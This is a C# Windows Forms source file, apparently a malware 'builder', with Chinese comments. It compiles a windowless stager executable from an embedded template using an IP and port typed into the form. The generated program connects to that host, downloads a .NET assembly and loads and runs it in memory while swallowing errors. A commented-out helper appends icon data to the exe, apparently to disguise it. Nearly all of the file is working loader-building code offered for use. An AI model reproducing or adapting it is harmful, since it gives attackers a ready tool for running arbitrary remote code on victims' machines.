using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace builder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
        public static void CompileAndRun(string code)
        {
            // 设置编译参数
            CompilerParameters compilerParams = new CompilerParameters();
            compilerParams.GenerateInMemory = false; // 将程序集保存为磁盘文件
            compilerParams.GenerateExecutable = true; // 生成可执行文件
            compilerParams.OutputAssembly = "output.exe"; // 输出文件名
            compilerParams.CompilerOptions = "/target:winexe"; // 设置输出类型为Windows应用程序

            // 添加所需的程序集引用
            compilerParams.ReferencedAssemblies.Add("System.dll");

            // 创建C#代码编译器
            CSharpCodeProvider provider = new CSharpCodeProvider();

            // 编译C#代码
            CompilerResults compileResults = provider.CompileAssemblyFromSource(compilerParams, code);

            // 检查编译是否成功
            if (compileResults.Errors.HasErrors)
            {
                string errors = "编译错误：";
                foreach (CompilerError error in compileResults.Errors)
                {
                    errors += error.ErrorText + "\n";
                }
                throw new InvalidOperationException(errors);
            }
            else
            {
                MessageBox.Show("编译成功");
            }
        }
        string code1 = "using System;\r\nusing System.Collections.Generic;\r\nusing System.Net.Sockets;\r\nusing System.Reflection;\r\nusing System.Threading;\r\n\r\nnamespace client\r\n{\r\n    internal class Program\r\n    {\r\n        ";
        string code2 = "\r\n        \r\n        public static void Main()\r\n        {\r\n             TcpClient client = new TcpClient(IP, port);\r\n             // 接收文件\r\n             byte[] receivedData = ReceiveFile(client);\r\n\r\n             client.Close();\r\n             RunPayload(receivedData);\r\n        }\r\n        public static byte[] ReceiveFile(TcpClient client)\r\n        {\r\n            NetworkStream netStream = client.GetStream();\r\n            List<byte> receivedBytes = new List<byte>();\r\n            byte[] buffer = new byte[4096];\r\n            int bytesRead;\r\n\r\n            while ((bytesRead = netStream.Read(buffer, 0, buffer.Length)) > 0)\r\n            {\r\n\r\n                for (int i = 0; i < bytesRead; i++)\r\n                {\r\n                    receivedBytes.Add(buffer[i]);\r\n                }\r\n            }\r\n\r\n            Console.WriteLine(\"文件接收完成。\");\r\n\r\n            return receivedBytes.ToArray();\r\n        }\r\n        private static void RunPayload(byte[] payload)\r\n        {\r\n            new Thread(() =>\r\n            {\r\n                try\r\n                {\r\n                    Assembly asm = AppDomain.CurrentDomain.Load(payload);\r\n                    MethodInfo Metinf = asm.EntryPoint;\r\n                    object InjObj = asm.CreateInstance(Metinf.Name);\r\n                    object[] parameters = new object[1];  // C#\r\n                    if (Metinf.GetParameters().Length == 0)\r\n                    {\r\n                        parameters = null; // VB.NET\r\n                    }\r\n                    Metinf.Invoke(InjObj, parameters);\r\n                }\r\n                catch { }\r\n            })\r\n            { IsBackground = false }.Start();\r\n        }\r\n\r\n    }\r\n}\r\n";

        private void button1_Click(object sender, EventArgs e)
        {
            string ip = textBox1.Text;
            string port = textBox2.Text;
            string code = code1 + $"static string IP = \"{ip}\";\n" + $"static int port = {port};" + code2;
            CompileAndRun(code);
           // AddIconToExe("output.exe", "1.jpg", "out.exe");
           // File.Delete("output.exe");
        }
        public static bool AddIconToExe(string exeFilePath, string iconFilePath, string outputExeFilePath)
        {
            try
            {
                // 读取exe文件的内容
                byte[] exeFile = File.ReadAllBytes(exeFilePath);
                // 读取ico图标文件
                byte[] iconFile = File.ReadAllBytes(iconFilePath);
                // 合并exe文件和ico图标文件
                byte[] combinedFile = CombineFiles(exeFile, iconFile);
                // 写入合并后的内容到新的exe文件
                File.WriteAllBytes(outputExeFilePath, combinedFile);
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred: " + ex.Message);
                return false;
            }
        }
        private static byte[] CombineFiles(byte[] exeFile, byte[] iconFile)
        {
            // 获取ico图标的字节数组长度
            int iconLength = iconFile.Length;
            // 创建一个新的字节数组，用于存储合并后的文件
            byte[] combinedFile = new byte[exeFile.Length + iconLength + 6];
            // 复制exe文件的内容到新的数组中
            Buffer.BlockCopy(exeFile, 0, combinedFile, 0, exeFile.Length);
            // 在新数组中添加ico图标的标记
            combinedFile[exeFile.Length] = 0; // Group icon type
            combinedFile[exeFile.Length + 1] = 0; // Reserved, must be 0
            combinedFile[exeFile.Length + 2] = 1; // Number of icons in the file (1)
            combinedFile[exeFile.Length + 3] = 0; // Reserved, must be 0
            combinedFile[exeFile.Length + 4] = 1; // Icon entry 1
            combinedFile[exeFile.Length + 5] = 0; // Reserved, must be 0 
            // 复制ico图标的内容到新数组中
            Buffer.BlockCopy(iconFile, 0, combinedFile, exeFile.Length + 6, iconLength);
            return combinedFile;
        }
    }
}
